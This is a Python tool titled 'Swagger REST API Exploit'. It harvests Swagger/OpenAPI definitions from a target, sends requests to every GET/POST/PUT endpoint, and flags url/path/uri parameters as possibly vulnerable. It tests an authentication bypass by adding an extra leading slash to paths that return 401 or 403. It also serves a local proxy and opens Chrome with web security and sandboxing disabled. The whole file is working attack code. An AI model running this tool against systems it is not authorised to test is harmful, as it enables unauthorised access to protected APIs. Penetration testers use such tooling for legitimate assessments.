#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# Swagger REST API Exploit
# By LiJieJie my[at]lijiejie.com

import sys
import requests
import json
import time
import codecs
import subprocess
import threading
import copy
import os
from lib.common import get_chrome_path
try:
    import urlparse
    from SocketServer import ThreadingMixIn
    from SimpleHTTPServer import SimpleHTTPRequestHandler
    from BaseHTTPServer import HTTPServer
except Exception as e:
    import urllib
    from socketserver import ThreadingMixIn
    from http.server import SimpleHTTPRequestHandler, HTTPServer


requests.packages.urllib3.disable_warnings()
api_set_list = []    # ALL API SET
scheme = 'http'    # default value
headers = {'User-Agent': 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'}
auth_bypass_detected = False


def print_msg(msg):
    if msg.startswith('[GET] ') or msg.startswith('[POST] ') or msg.startswith('[PUT] '):
        out_file.write('\n')
    _msg = '[%s] %s' % (time.strftime('%H:%M:%S', time.localtime()), msg)
    print(_msg)
    out_file.write(_msg + '\n')


def find_all_api_set(start_url):
    try:
        text = requests.get(start_url, headers=headers, verify=False).text
        json_doc = json.loads(text)
        if text.strip().startswith('{"swagger":"') or "openapi" in json_doc or "swagger" in json_doc:
            # from swagger.json
            api_set_list.append(start_url)
            print_msg('[OK] [API set] %s' % start_url)
            with codecs.open('api-docs.json', 'w', encoding='utf-8') as f:
                f.write(text)
        elif text.find('"swaggerVersion"') > 0:    # from /swagger-resources/
            base_url = start_url[:start_url.find('/swagger-resources')]
            for item in json_doc:
                url = base_url + item['location']
                find_all_api_set(url)
        else:
            print_msg('[FAIL] Invalid API Doc: %s' % start_url)
    except Exception as e:
        print_msg('[find_all_api_set] process error %s' % str(e))


def process_doc(url):
    try:
        json_doc = requests.get(url, headers=headers, verify=False).json()
        if 'host' in json_doc:
            base_url = scheme + '://' + json_doc['host'] + json_doc['basePath']
        elif 'servers' in json_doc:
            server_url = json_doc['servers'][0]['url']
            if server_url.lower().startswith('http'):
                base_url = server_url
            else:
                base_url = scheme + '://' + urlparse.urlparse(url, 'http').netloc + server_url
                # update base_url to absolute url
                json_doc['servers'][0]['url'] = base_url
                with codecs.open('api-docs.json', 'w', encoding='utf-8') as f:
                    f.write(json.dumps(json_doc, indent=4))
        else:
            base_url = scheme + '://' + urlparse.urlparse(url, 'http').netloc
        base_url = base_url.rstrip('/')
        for path in json_doc['paths']:

            for method in json_doc['paths'][path]:
                if method.upper() not in ['GET', 'POST', 'PUT']:
                    continue

                params_str = ''
                sensitive_words = ['url', 'path', 'uri']
                sensitive_params = []
                if 'parameters' in json_doc['paths'][path][method]:
                    parameters = json_doc['paths'][path][method]['parameters']

                    for parameter in parameters:
                        para_name = parameter['name']
                        # mark sensitive parma
                        for word in sensitive_words:
                            if para_name.lower().find(word) >= 0:
                                sensitive_params.append(para_name)
                                break

                        if 'format' in parameter:
                            para_format = parameter['format']
                        elif 'schema' in parameter and 'format' in parameter['schema']:
                            para_format = parameter['schema']['format']
                        elif 'schema' in parameter and 'type' in parameter['schema']:
                            para_format = parameter['schema']['type']
                        elif 'schema' in parameter and '$ref' in parameter['schema']:
                            para_format = parameter['schema']['$ref']
                            para_format = para_format.replace('#/definitions/', '')
                            para_format = '{OBJECT_%s}' % para_format
                        else:
                            para_format = parameter['type'] if 'type' in parameter else 'unkonwn'

                        is_required = '' if 'required' in parameter and parameter['required'] else '*'
                        params_str += '&%s=%s%s%s' % (para_name, is_required, para_format, is_required)
                    params_str = params_str.strip('&')
                    if sensitive_params:
                        print_msg('[*] Possible vulnerable param found: %s, path is %s' % (
                            sensitive_params, base_url+path))

                scan_api(method, base_url, path, params_str)
    except Exception as e:
        import traceback
        traceback.print_exc()
        print_msg('[process_doc error][%s] %s' % (url, e))


def scan_api(method, base_url, path, params_str, error_code=None):
    # place holder
    _params_str = params_str.replace('*string*', 'a')
    _params_str = _params_str.replace('*int64*', '1')
    _params_str = _params_str.replace('*int32*', '1')
    _params_str = _params_str.replace('=string', '=test')
    api_url = base_url + path
    if not error_code:
        print_msg('[%s] %s %s' % (method.upper(), api_url, params_str))
    if method.upper() == 'GET':
        r = requests.get(api_url + '?' + _params_str, headers=headers, verify=False)
        if not error_code:
            print_msg('[Request] %s %s' % (method.upper(), api_url + '?' + _params_str))
    else:
        r = requests.post(api_url, data=_params_str, headers=headers, verify=False)
        if not error_code:
            print_msg('[Request] %s %s \n%s' % (method.upper(), api_url, _params_str))

    content_type = r.headers['content-type'] if 'content-type' in r.headers else ''
    content_length = r.headers['content-length'] if 'content-length' in r.headers else ''
    if not content_length:
        content_length = len(r.content)
    if not error_code:
        print_msg('[Response] Code: %s Content-Type: %s Content-Length: %s' % (
            r.status_code, content_type, content_length))
    else:
        if r.status_code not in [401, 403] or r.status_code != error_code:
            global auth_bypass_detected
            auth_bypass_detected = True
            print_msg('[VUL] *** URL Auth Bypass ***')
            if method.upper() == 'GET':
                print_msg('[Request] [%s] %s' % (method.upper(), api_url + '?' + _params_str))
            else:
                print_msg('[Request] [%s] %s \n%s' % (method.upper(), api_url, _params_str))

    # Auth Bypass Test
    if not error_code and r.status_code in [401, 403]:
        path = '/' + path
        scan_api(method, base_url, path, params_str, error_code=r.status_code)


class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass


class RequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/proxy?url='):
            url = self.path[11:]
            if url.lower().startswith('http') and url.find('@') < 0:
                text = requests.get(url, headers=headers, verify=False).content
                if text.find('"schemes":[') < 0:
                    text = text[0] + '"schemes":["https","http"],' + text[1:]    # HTTP(s) Switch
                global auth_bypass_detected
                if auth_bypass_detected:
                    json_doc = json.loads(text)
                    paths = copy.deepcopy(json_doc['paths'].keys())
                    for path in paths:
                        json_doc['paths']['/' + path] = json_doc['paths'][path]
                        del json_doc['paths'][path]

                    text = json.dumps(json_doc)
            else:
                text = 'Request Error'
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.send_header("Content-length", len(text))
            self.end_headers()
            self.wfile.write(text)

        return SimpleHTTPRequestHandler.do_GET(self)


def chrome_open(chrome_path, url, server):
    time.sleep(2.0)
    if chrome_path:
        url_txt = url + '/api_summary.txt' if len(sys.argv) > 1 else ''
        cwd = os.path.split(os.path.abspath(__file__))[0]
        user_data_dir = os.path.abspath(os.path.join(cwd, 'chromeSwagger'))
        cmd = '"%s" --disable-web-security --no-sandbox --new-window--disable-gpu ' \
              '--user-data-dir=%s %s %s' % (chrome_path, user_data_dir, url, url_txt)
        p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        while p.poll() is None:
            time.sleep(1.0)

        server.shutdown()
        print_msg('Server shutdown.')
        if out_file:
            out_file.flush()
            out_file.close()


if __name__ == '__main__':
    out_file = codecs.open('api_summary.txt', 'w', encoding='utf-8')
    if len(sys.argv) > 1:
        try:
            _scheme = urlparse.urlparse(sys.argv[1]).scheme.lower()
        except Exception as e:
            _scheme = urllib.parse.urlparse(sys.argv[1]).scheme.lower()
        if _scheme.lower() == 'https':
            scheme = 'https'
        find_all_api_set(sys.argv[1])
        for url in api_set_list:
            process_doc(url)

    server = ThreadingSimpleServer(('127.0.0.1', 0), RequestHandler)
    url = 'http://127.0.0.1:%s' % server.server_port
    print_msg('Swagger UI Server on: %s' % url)
    chrome_path = get_chrome_path()
    if not chrome_path:
        print_msg('[ERROR] Chrome executable not found')
    else:
        print_msg('Open Swagger UI with chrome')
        threading.Thread(target=chrome_open, args=(chrome_path, url, server)).start()

    server.serve_forever()
